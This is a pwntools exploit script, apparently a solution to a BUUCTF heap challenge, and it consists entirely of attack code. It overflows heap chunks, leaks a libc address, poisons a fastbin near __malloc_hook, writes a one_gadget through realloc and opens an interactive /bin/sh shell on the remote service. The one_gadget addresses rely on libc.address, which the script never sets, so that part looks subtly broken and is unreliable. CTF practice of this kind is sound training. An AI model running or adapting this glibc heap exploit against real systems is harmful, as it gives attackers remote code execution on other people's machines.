from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
io = remote('node4.buuoj.cn', 25872)
elf = ELF("./pwn")
#libc = elf.libc
libc = ELF("/home/isidro/pwnh/buuctf/libc/u16-x64.so")
local = False

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'Your choice:'
def add(size, content):
	sla(menu, b'2')
	sla(b'item name:', byte(size))
	sda(b'name of item:', content)	

def dele(idx):
	sla(menu, b'4')
	sla(b'index of item:', byte(idx))

def show():
	sla(menu, b'1')

def edit(idx, size, content):
	sla(menu, b'3')
	sla(b'index of item:', byte(idx))
	sla(b'item name:', byte(size))
	sda(b'name of the item:', content)

offset = 0x3c4aed # 0x7f -> 0x70
add(0x60, b'A\n') # 0
add(0x80, b'A\n') # 1
add(0x60, b'A\n') # 2
add(0x80, b'A\n') # 3
add(0x10, b'A\n') # 4

dele(1)
payload = b'A'*0x60 + p64(0x100) + p64(0x90)
edit(2, len(payload), payload)
dele(3)
add(0x80, b'A\n') # 1
show()
rut(b'2 : ')
libc_base = addr(b'4 : ') - 88 - 0x10 - libc.symbols['__malloc_hook']
print("libc_base : ", hex(libc_base))
add(0x60, b'A\n') # 3
dele(0)
dele(2)
fake_chunk = libc_base + offset
print("fake_chunk : ", hex(fake_chunk))
payload = p64(fake_chunk) + b'\n'
edit(3, len(payload), payload)
add(0x60, b'A')
if local:
        one_gadget1 = libc.address + 0x45226
        one_gadget2 = libc.address + 0x4527a
        one_gadget3 = libc.address + 0xf03a4
        one_gadget4 = libc.address + 0xf1247
else:
        one_gadget1 = libc.address + 0x45216 #execve("/bin/sh", rsp+0x30, environ)
        one_gadget2 = libc.address + 0x4526a #execve("/bin/sh", rsp+0x30, environ)
        one_gadget3 = libc.address + 0xf02a4 #execve("/bin/sh", rsp+0x50, environ)
        one_gadget4 = libc.address + 0xf1147 #execve("/bin/sh", rsp+0x70, environ)
realloc_hook = libc_base + libc.symbols['realloc']
payload = b'A'*0xB + p64(one_gadget2) + p64(realloc_hook+6)

add(0x60, payload)
#debug()
sla(menu, b'2')
sla(b'item name:', b'1')
#debug()
sh()
